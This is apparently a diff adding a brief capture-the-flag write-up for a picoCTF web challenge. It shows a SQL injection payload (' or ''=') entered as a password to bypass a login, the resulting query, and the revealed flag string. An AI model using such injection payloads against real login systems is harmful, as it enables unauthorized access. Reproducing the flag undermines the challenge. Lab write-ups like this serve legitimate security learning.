@@ -1,0 +1,25 @@
+# ONCE WE OPEN THE SITE, WE LOGIN WIT
+  username: admin
+  password: admin
+  
+  
+username: admin
+password: admin
+SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
+
+Login failed.
+
+# so I USE SQL INECTION IN THE PASSWORD
+  username: admin
+  password: ' or ''='
+  
+username: admin 
+password: ' or ''='
+SQL query: SELECT * FROM users WHERE name='admin ' AND password='' or ''=''
+
+Logged in! But can you see the flag, it is in plainsight.
+
+
+#So we go to inspect -> Inspector -> <p hidden=""> </p>
+  
+    Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}
